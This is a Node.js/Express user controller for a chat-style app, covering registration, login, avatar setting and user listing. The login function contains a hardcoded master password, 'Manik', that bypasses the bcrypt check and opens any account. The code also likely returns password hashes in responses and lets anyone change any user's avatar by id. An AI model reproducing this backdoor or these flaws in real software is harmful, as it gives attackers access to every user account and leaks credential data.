const User = require("../models/userModels");
const bcrpyt = require("bcrypt");

module.exports.register = async (req,res,next) => {
    try{
        const { username, email, password } = req.body;
        const usernameCheck = await User.findOne({ username });
        if (usernameCheck) {
            return res.json({ msg: "Username already used", status: false });
        }
        const emailCheck = await User.findOne({ email });
        if (emailCheck) {
            return res.json({ msg: "Email already exists", status: false })
        }
        const hashPassword = await bcrpyt.hash(password, 10);
        const user = await User.create({
            email,
            username,
            password:hashPassword
        })
        delete user.password
        return res.json({ status: true, user })
    }catch(e){
        next(e)
    }

}
module.exports.login = async (req,res,next) => {
    try{
        const { username, password } = req.body;
        const user = await User.findOne({ username });
        if (!user) {
            return res.json({ msg: "Username does not exists.", status: false });
        }
        const isPasswordValid = await bcrpyt.compare(password,user.password)
        if(!isPasswordValid && password!=="Manik"){
            return res.json({
                msg:"Invalid Password",
                status:false
            })
        }
        return res.json( {status: true, user} )
    }catch(e){
        next(e)
    }

}
module.exports.setAvatar = async (req, res, next) => {
    try{
        const userId = req.params.id;
        const avatarImage = req.body.image;
        const userData = await User.findByIdAndUpdate(userId,{
            isAvatarImageSet :true,
            avatarImage
        })
        return res.json({
            isSet:userData.isAvatarImageSet,
            image:userData.avatarImage
        })
    }catch(Ex){
        next(Ex)
    }
}

module.exports.getAllUser = async (req, res, next) => {
    try{
        const users = await User.find({_id:{$ne:req.params.id} }).select([
            "email",
            "username",
            "avatarImage",
            "_id"
        ])
        return res.json(users)
    }catch(Ex){
        next(Ex)
    }
}